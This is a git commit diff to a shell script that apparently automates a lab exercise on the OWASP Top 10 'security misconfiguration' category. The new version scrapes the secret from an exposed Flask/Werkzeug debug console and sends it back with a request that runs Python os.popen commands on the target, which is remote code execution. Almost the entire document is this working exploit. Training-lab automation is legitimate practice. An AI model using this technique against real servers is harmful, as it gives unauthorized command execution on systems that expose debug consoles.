25323893ea8b39ddae36664053ba51573407e658
Nadege Lemperiere <nadege.lemperiere@gmail.com>
2024-11-30 21:36:16 -0500

    Testing script

--- rooms/owasptop102021/5-security-misconfiguration.sh
+++ rooms/owasptop102021/5-security-misconfiguration.sh
@@ -17,6 +17,13 @@ curl -s -X GET "http://$target_ip:86" -c "/work/cookie-id.txt" -L > /dev/null
 PHPSESSID=$(grep PHPSESSID "/work/cookie-id.txt" | awk '{print $7}')
 echo "--> Session initiated : $PHPSESSID"
 
-# Sending python script
-echo "2 - Sending python script to list files"
-curl -s -X GET "http://$target_ip:86/console?__debugger__=yes&cmd=import%20os%3B%20print(os.popen(%22ls%20-l%22).read())" > /work/5-ls.html
+# Retrieving console secret
+echo "2 - RETRIEVING CONSOLE SECRET"
+curl -s -X GET "http://$target_ip:86/console" > /work/5-console.html
+SECRET=$(awk -F'"' '/SECRET =/ {print $2}' /work/5-console.html)
+echo "--> Console secret is : $SECRET"
+
+# Listing files
+echo "3 - LISTING FILES WITH PYTHON"
+curl -s -X GET "http://$target_ip:86/console?cmd=cmd=import%20os%3B%20print(os.popen(%22ls%20-l%22).read())&__debugger__=yes&frm=0&s=$SECRET" > /work/5-ls.html
+
